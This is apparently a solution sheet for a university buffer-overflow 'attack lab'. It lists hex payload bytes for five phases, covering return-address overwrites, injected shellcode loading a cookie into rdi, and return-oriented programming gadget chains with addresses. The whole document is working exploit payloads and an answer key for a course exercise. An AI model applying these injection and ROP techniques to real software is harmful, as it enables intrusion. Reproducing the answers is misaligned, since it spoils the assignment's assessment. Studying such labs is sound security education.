target2 editorial

- touch1

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 //buf end
37 18 40 00 00 00 00 00 //touch 1

- touch2

48 c7 c7 3a 4e db 47 c3 //mov $0x47db4e3a(cookie val) -> rdi
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 //buf end
78 27 65 55 00 00 00 00 //beginning of buf
63 18 40 00 00 00 00 00 //touch 2

- touch3

48 c7 c7 c0 27 65 55 c3 // mov $0x556527c0(addr of string) -> rdi
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 //buf end
78 27 65 55 00 00 00 00 //beginning of buf
74 19 40 00 00 00 00 00 //touch3
34 37 64 62 34 65 33 61 //cookie string(ascii)

- touch4 (rtarget touch2)

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 //buf end
e2 2b 40 00 00 00 00 00 //popq rdi
3a 4e db 47 00 00 00 00 //0x47db4e3a (cookie val)
63 18 40 00 00 00 00 00 //touch2

- touch5 (rtarget touch3)

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 //buf end
2a 1a 40 00 00 00 00 00 //popq rax
20 00 00 00 00 00 00 00 //$0x20 (4 lines)
19 1b 40 00 00 00 00 00 //mov eax -> ecx
cb 1a 40 00 00 00 00 00 //mov ecx -> edx
75 1a 40 00 00 00 00 00 //mov edx -> esi
e0 1a 40 00 00 00 00 00 //mov rsp -> rax
20 1a 40 00 00 00 00 00 //mov rax -> rdi
4d 1a 40 00 00 00 00 00 //rsi + rdi -> rax
20 1a 40 00 00 00 00 00 //mov rax -> rdi
74 19 40 00 00 00 00 00 //touch3
34 37 64 62 34 65 33 61 //cookie string(ascii)